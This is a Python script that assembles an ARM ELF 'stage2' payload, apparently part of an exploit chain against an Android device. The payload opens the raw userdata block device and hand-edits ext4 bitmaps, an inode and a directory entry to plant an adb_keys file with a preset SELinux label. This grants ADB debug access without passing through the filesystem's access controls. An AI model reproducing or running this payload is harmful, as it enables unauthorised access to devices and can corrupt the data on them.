"""Fix adb_keys: point the dirent to a truly free inode (164832)."""

import os
import struct

from keystone import keystone as K

BASE = 0x400000
ENTRY = BASE + 0x100
BS = 4096

HERE = os.path.dirname(os.path.abspath(__file__))

content = open(os.path.join(HERE, 'fixed_adb_content_655931.bin'), 'rb').read()
inode = open(os.path.join(HERE, 'selinux_labeled_adb_inode_164165.bin'), 'rb').read()
assert len(content) == 4096 and len(inode) == 256

NEW_INO = 164832
BUF = 0x50000000

BBM_BLOCK, BBM_OFF, BBM_BIT = 655360, 71, 0x08
IBM_BLOCK, IBM_OFF, IBM_BIT = 655361, 83, 0x80
CONTENT_BLOCK = 655931
INODE_INDEX = NEW_INO - 164161
INODE_BYTE = INODE_INDEX * 256
INODE_BLOCK = 655362 + INODE_BYTE // BS
INODE_OFF = INODE_BYTE % BS
DIR_BLOCK, DIRENT_OFF = 655917, 24


def movconst(reg, value):
    return '    movw {0}, #{1:#06x}\n    movt {0}, #{2:#06x}'.format(
        reg, value & 0xFFFF, (value >> 16) & 0xFFFF)


def seek(off):
    hi, lo = (off >> 32) & 0xFFFFFFFF, off & 0xFFFFFFFF
    return """
    sub sp, sp, #16
    mov r0, r6
    movw r1, #{hl}
    movt r1, #{hh}
    movw r2, #{ll}
    movt r2, #{lh}
    mov r3, sp
    mov r4, #0
    mov r7, #140
    svc #0
    add sp, sp, #16
""".format(hl=hi & 0xFFFF, hh=(hi >> 16) & 0xFFFF, ll=lo & 0xFFFF, lh=(lo >> 16) & 0xFFFF)


LABELS = {
    'tag': '\n=== FIX_ADB_KEYS_FINAL ===\n',
    'ud': '/dev/block/platform/bootdevice/by-name/userdata',
    'ok': 'OK\n',
    's1': 'PATCH_BLOCK_BITMAP: ',
    's2': 'PATCH_INODE_BITMAP: ',
    's3': 'W_CONTENT_655931: ',
    's4': 'W_INODE_164832: ',
    's5': 'W_DIRENT_INO: ',
    'end': '=== FIX_ADB_KEYS_COMPLETED ===\n',
    'eacces': 'EACCES\n', 'enoent': 'ENOENT\n', 'eperm': 'EPERM\n',
    'einval': 'EINVAL\n', 'eother': 'EOTHER\n', 'short': 'SHORT_IO\n',
}
ORDER = list(LABELS)
DATA_HDR = b''.join(LABELS[k].encode() + b'\x00' for k in ORDER)
DATA_HDR += b'\x00' * ((4 - len(DATA_HDR) % 4) % 4)
OFFSET = {}
_p = 0
for _k in ORDER:
    OFFSET[_k] = _p
    _p += len(LABELS[_k].encode()) + 1


def make_source(addr_of, buf_c, buf_i, buf4):
    def C(reg, name):
        return movconst(reg, addr_of(name))

    return """
_start:
    push {{r4, r5, r6, r7, lr}}

{tag}
    bl  puts

    // mmap 16KB scratch at 0x50000000
    movw r0, #0x0000
    movt r0, #0x5000
    mov r1, #0x4000
    mov r2, #3
    mov r3, #0x22
    mvn r4, #0
    mov r5, #0
    mov r7, #192
    svc #0
    mov r5, r0
    cmp r0, #0
    blt done

{ud}
    mov r1, #2
    bl  sys_open
    cmp r0, #0
    blt fail
    mov r6, r0

    // ---- block bitmap ----
{s1}
    bl  puts
{seek_bbm}
    mov r0, r6
    mov r1, r5
    mov r2, #4096
    mov r7, #3
    svc #0
    cmp r0, #4096
    bne short
    ldrb r1, [r5, #{bbm_off}]
    orr r1, r1, #{bbm_bit}
    strb r1, [r5, #{bbm_off}]
{seek_bbm}
    mov r0, r6
    mov r1, r5
    mov r2, #4096
    mov r7, #4
    svc #0
    cmp r0, #4096
    bne short
{ok}
    bl  puts

    // ---- inode bitmap ----
{s2}
    bl  puts
{seek_ibm}
    mov r0, r6
    mov r1, r5
    mov r2, #4096
    mov r7, #3
    svc #0
    cmp r0, #4096
    bne short
    ldrb r1, [r5, #{ibm_off}]
    orr r1, r1, #{ibm_bit}
    strb r1, [r5, #{ibm_off}]
{seek_ibm}
    mov r0, r6
    mov r1, r5
    mov r2, #4096
    mov r7, #4
    svc #0
    cmp r0, #4096
    bne short
{ok}
    bl  puts

    // ---- content ----
{s3}
    bl  puts
{seek_content}
    mov r0, r6
    {buf_c}
    mov r2, #4096
    mov r7, #4
    svc #0
    cmp r0, #4096
    bne short
{ok}
    bl  puts

    // ---- inode ----
{s4}
    bl  puts
{seek_inode}
    mov r0, r6
    {buf_i}
    mov r2, #256
    mov r7, #4
    svc #0
    cmp r0, #256
    bne short
{ok}
    bl  puts

    // ---- dirent ----
{s5}
    bl  puts
{seek_dirent}
    mov r0, r6
    {buf_4}
    mov r2, #4
    mov r7, #4
    svc #0
    cmp r0, #4
    bne short
{ok}
    bl  puts

    mov r0, r6
    mov r7, #118
    svc #0
    mov r0, r6
    mov r7, #6
    svc #0

{end}
    bl  puts
    b   done

short:
    mov r0, #1
    mov r7, #1
    svc #0

fail:
    bl  err_sym

done:
    mov r0, #0
    mov r7, #1
    svc #0

sys_open:
    mov r2, #0
    mov r7, #5
    svc #0
    bx  lr

err_sym:
    push {{lr}}
    cmn r0, #13
    beq err_eacces
    cmn r0, #2
    beq err_enoent
    cmn r0, #1
    beq err_eperm
    cmn r0, #22
    beq err_einval
{eother}
    bl  puts
    pop {{pc}}
err_eacces:
{eacces}
    bl  puts
    pop {{pc}}
err_enoent:
{enoent}
    bl  puts
    pop {{pc}}
err_eperm:
{eperm}
    bl  puts
    pop {{pc}}
err_einval:
{einval}
    bl  puts
    pop {{pc}}

puts:
    mov r1, r0
    mov r2, #0
puts_loop:
    ldrb r3, [r1, r2]
    cmp r3, #0
    beq puts_done
    add r2, r2, #1
    b   puts_loop
puts_done:
    mov r0, #1
    mov r7, #4
    svc #0
    bx  lr
""".format(
        tag=C('r0', 'tag'), ud=C('r0', 'ud'), ok=C('r0', 'ok'),
        s1=C('r0', 's1'), s2=C('r0', 's2'), s3=C('r0', 's3'),
        s4=C('r0', 's4'), s5=C('r0', 's5'), end=C('r0', 'end'),
        eacces=C('r0', 'eacces'), enoent=C('r0', 'enoent'),
        eperm=C('r0', 'eperm'), einval=C('r0', 'einval'),
        eother=C('r0', 'eother'),
        seek_bbm=seek(BBM_BLOCK * BS),
        seek_ibm=seek(IBM_BLOCK * BS),
        seek_content=seek(CONTENT_BLOCK * BS),
        seek_inode=seek(INODE_BLOCK * BS + INODE_OFF),
        seek_dirent=seek(DIR_BLOCK * BS + DIRENT_OFF),
        bbm_off=BBM_OFF, bbm_bit=BBM_BIT,
        ibm_off=IBM_OFF, ibm_bit=IBM_BIT,
        buf_c=movconst('r1', buf_c),
        buf_i=movconst('r1', buf_i),
        buf_4=movconst('r1', buf4),
    )


def build():
    ks = K.Ks(K.KS_ARCH_ARM, K.KS_MODE_ARM)
    code1, _ = ks.asm(make_source(lambda n: BASE, 0, 0, 0), ENTRY)
    code_len = len(bytes(code1))
    hdr_at = ENTRY + code_len
    buf_c = hdr_at + len(DATA_HDR)
    buf_i = buf_c + 4096
    buf4 = buf_i + 256
    if buf4 % 4:
        buf4 += 4 - buf4 % 4
    code2, count = ks.asm(make_source(lambda n: hdr_at + OFFSET[n], buf_c, buf_i, buf4), ENTRY)
    code2 = bytes(code2)
    assert len(code2) == code_len, (len(code2), code_len)

    dirnum = struct.pack('<I', NEW_INO)
    blob = b'\x00' * (ENTRY - BASE - 84) + code2 + DATA_HDR + content + inode
    blob += b'\x00' * ((4 - len(blob) % 4) % 4)
    blob += dirnum
    blob += b'\x00' * ((4 - len(blob) % 4) % 4)
    filesz = 52 + 32 + len(blob)
    ident = b'\x7fELF' + bytes([1, 1, 1, 0]) + b'\x00' * 8
    ehdr = ident + struct.pack('<HHIIIIIHHHHHH', 2, 40, 1, ENTRY, 52, 0, 0, 52, 32, 1, 0, 0, 0)
    phdr = struct.pack('<IIIIIIII', 1, 0, BASE, BASE, filesz, filesz, 7, 0x1000)
    elf = ehdr + phdr + blob
    out = os.path.join(HERE, 'stage2_fix_adb.elf')
    with open(out, 'wb') as f:
        f.write(elf)
    print('ok', out, len(elf), 'inode@', INODE_BLOCK, INODE_OFF,
          'dirent@', DIR_BLOCK, DIRENT_OFF, 'new_ino', NEW_INO)


if __name__ == '__main__':
    build()
